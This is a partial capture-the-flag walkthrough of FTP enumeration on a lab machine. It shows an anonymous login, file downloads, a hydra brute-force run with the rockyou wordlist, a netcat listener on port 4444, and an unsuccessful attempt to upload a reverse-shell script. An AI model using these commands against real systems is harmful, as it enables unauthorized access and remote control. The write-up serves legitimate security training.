nmap scan

From our scan we see that port 21 is open running the FTP service - `vsftpd 3.0.3`
This shows up as a common vulnerability. 
CVE-2021-30047 resulting in a denial of service. 

Lets attempt to connect with `FTP`. 

```php
ftp 10.129.229.90
```

Lets attempt some default credentials and see if we can get in.

```php
Connected to 10.129.229.90.
220 (vsFTPd 3.0.3)
Name (10.129.229.90:drew): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

Using `anonymous` we get in on our first try.
In the directory we see a bunch files, lets download them and see what we got.

```php
get MigrateOpenWrt.txt
get ProjectGreatMigration.pdf
get ProjectGreatMigration.pdf
get backup-OpenWrt-2023-07-26.tar
get employees_wellness.pdf
```

Looks like this is the only directory, no moving up or moving out.

```php
hydra -l user -p /home/drew/tools/SecLists/Passwords/Leaked-Databases/rockyou.txt ftp://10.129.229.90
```

We couldn't get any credentials out of it.

```python
python3 -m http.server
```

```php
nc -nvlp 4444
Listening on 0.0.0.0 4444
```

```php
put http://10.129.229.90/htbrevshell.sh
```

Okay it looks like at this step we get stuck, we don't have the permissions to download files on this account. Lets come back to this. 

Time to explore those files we just downloaded for any information that could be useful. 

